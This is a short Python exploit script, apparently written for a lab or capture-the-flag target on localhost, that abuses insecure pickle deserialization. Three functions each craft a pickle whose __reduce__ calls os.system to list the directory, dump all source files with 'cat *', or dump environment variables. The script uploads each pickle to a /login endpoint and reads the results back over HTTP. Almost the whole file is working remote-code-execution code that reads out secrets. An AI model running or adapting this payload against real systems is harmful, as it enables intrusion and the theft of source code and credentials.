import requests 
import pickle
import os


def ls_dir():
	class Payload1():
		def __reduce__(self):
			return (os.system, ('ls > tmp/out1.txt', ))

	payload1 = pickle.dumps(Payload1())
	with open("payload1.pickle", "wb") as file:
		file.write(payload1)

	files1 = {'pickle': open('payload1.pickle', 'rb')}
	os.remove('payload1.pickle')

	r = requests.post("http://localhost:8000/login", files=files1)
	# print(r.content.decode())

	r = requests.get("http://localhost:8000/tmp/out1.txt")
	print(r.content.decode())


def cat_src():
	class Payload2():
		def __reduce__(self):
			return (os.system, ('cat * > tmp/out2.txt', ))

	payload2 = pickle.dumps(Payload2())
	with open("payload2.pickle", "wb") as file:
		file.write(payload2)

	files2 = {'pickle': open('payload2.pickle', 'rb')}
	os.remove('payload2.pickle')

	r = requests.post("http://localhost:8000/login", files=files2)
	# print(r.content.decode())

	r = requests.get("http://localhost:8000/tmp/out2.txt")
	print(r.content.decode())


def dump_env():
	class Payload3():
		def __reduce__(self):
			return (os.system, ('env > tmp/out3.txt', ))

	payload3 = pickle.dumps(Payload3())
	with open("payload3.pickle", "wb") as file:
		file.write(payload3)

	files3 = {'pickle': open('payload3.pickle', 'rb')}
	os.remove('payload3.pickle')

	r = requests.post("http://localhost:8000/login", files=files3)
	# print(r.content.decode())

	r = requests.get("http://localhost:8000/tmp/out3.txt")
	print(r.content.decode())


if __name__ == "__main__":
	ls_dir()
	cat_src()
	dump_env()
